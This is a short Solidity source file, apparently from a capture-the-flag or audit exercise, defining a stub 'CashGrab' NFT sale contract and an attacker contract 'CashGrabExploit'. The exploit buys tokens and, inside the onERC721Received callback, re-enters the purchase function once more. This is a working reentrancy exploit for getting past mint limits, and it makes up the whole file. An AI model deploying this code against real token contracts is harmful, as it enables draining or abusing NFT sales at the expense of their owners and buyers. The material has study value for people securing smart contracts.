// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CashGrab {
    function purchase(uint256 numberOfTokens) public payable {}
}

contract CashGrabExploit is IERC721Receiver {
    CashGrab CG;
    bool private _alreadyPurchased;

    uint256 public balance = 0;
    event Received(address, uint256);

    receive() external payable {
        emit Received(msg.sender, msg.value);
    }

    function GetContract(address _t) public {
        CG = CashGrab(_t);
    }

    function Exploit() public {
        CG.purchase{value: 1000000000000000000}(20);
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external override returns (bytes4) {
        if (!_alreadyPurchased) {
             _alreadyPurchased = true;
             CG.purchase{value: 1000000000000000000}(20);
        }

        return 0x150b7a02;
    }
}
